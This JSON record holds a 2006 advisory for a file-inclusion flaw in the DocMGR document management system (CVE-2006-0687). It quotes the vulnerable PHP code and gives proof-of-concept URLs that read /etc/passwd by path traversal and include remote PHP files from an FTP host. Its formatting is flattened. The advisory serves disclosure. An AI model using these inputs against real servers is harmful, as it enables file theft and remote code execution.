{
    "text": "vul_name : DocMGR <= 0.54.2 arbitrary remote inclusion ， vul_cve : CVE-2006-0687 ， vul_poc : - DocMGR <= 0.54.2 arbitrary remote inclusion - ， software :  ， site :  ， description : \"DocMGR is a complete , web-based Document Management System ( DMS ) . ， It allows for the storage of any file type , and supports full-text indexing of ， the most popular document formats. It is available in many different languages ， and is easy to translae into new languages. DocMGR runs on PHP , the Apache ， webserver , and Postgresql\" ， i )  ， vulnerable code in modules/center/admin/accounts/process.php :  ， <? ，  $ pageAction = $ _POST [ \"pageAction\" ]  ;  ，  $ includeModule = $ _REQUEST [ \"includeModule\" ]  ;  ， elseif (  $ _SESSION [ \"accountId\" ]  ! =NULL )  $ accountId = $ _SESSION [ \"accountId\" ]  ;  ， process our search string ，  $ searchString = $ _REQUEST [ \"searchString\" ]  ;  ，  $ searchHeader = \"<div class=\"toolHeader\"> ， Results For \". $ searchString.\" ， </div> ， \" ;  ，  $ option = null ;  ， } ， /create our search parameter array ，  $ option = null ;  ，  $ option [ \"conn\" ] = $ conn ;  ，  $ option [ \"searchParm\" ]  [ \"login\" ] = $ searchString ;  ，  $ option [ \"searchParm\" ]  [ \"first_name\" ] = $ searchString ;  ，  $ option [ \"searchParm\" ]  [ \"last_name\" ] = $ searchString ;  ，  $ option [ \"wildcard\" ] = \"last\" ;  ，  $ searchResults = returnAccountList (  $ option )  ;  ， /if we find one match , load this account ，  $ accountId = $ searchResults [ \"id\" ]  [ 0 ]  ;  ，  $ pageAction = null ;  ，  $ _POST [ \"pageAction\" ] = null ;  ，  $ includeModule=\"accountprofile\" ;  ， } ，  $ _SESSION [ \"accountId\" ] = null ;  ，  $ accountId = null ;  ，  $ includeModule = null ;  ， } ， } ，  $ _SESSION [ \"accountId\" ] = $ accountId ;  ，  $ accountInfo = returnAccountInfo (  $ conn ,  $ accountId , LDAP_BASE )  ;  ， /make sure this user can alter the account. If the account is an admin , then they cannot ， /see if this user has permissions to edit other users ，  $ siteErrorMessage = \"You do not have permissions to edit other usersn\" ;  ， /see if this is an non-admin user trying to edit an administrator ，  $ bitset_temp = returnUserBitset (  $ conn ,  $ accountId )  ;  ，  $ permErrorMessage = \"You cannot edit this user. This user is an administrator.\" ;  ， } ， } ， } ， } ， /processing for our sub module. We cannot call these with a function , or ， /we do not get information passed from process to display like we want ，  $ processPath = $ siteModInfo [ \" $ includeModule\" ]  [ \"module_path\" ] .\"process.php\" ;  ，  $ functionPath = $ siteModInfo [ \" $ includeModule\" ]  [ \"module_path\" ] .\"function.php\" ;  ， . ，  $ includeModule var is not initizialized so , if register_globals = On , you can ， set it to an index of your choice , ex : \"suntzu\" now ，  $ siteModInfo [ \"suntzu\" ]  [ \"module_path\" ] is not initizialized. ， On PHP 4 , with magic quotes = Off you can now include an arbitrary local ， resource , poc :  ， hp?includeModule=suntzu&siteModInfo [ suntzu ]  [ module_path ] =./././././ ， ././././etc/passwd%00 ， on PHP 5 - on it the file_exists (  ) function supports ftp resources. - you can ， include from remote an arbitrary process.php or function.php file , poc :  ， hp?includeModule=suntzu&siteModInfo [ suntzu ]  [ module_path ] =ftp : /username :  ， password ( at ) somehost ( dot ) com [ email concealed ] /",
    "time": "2006.02.15"
}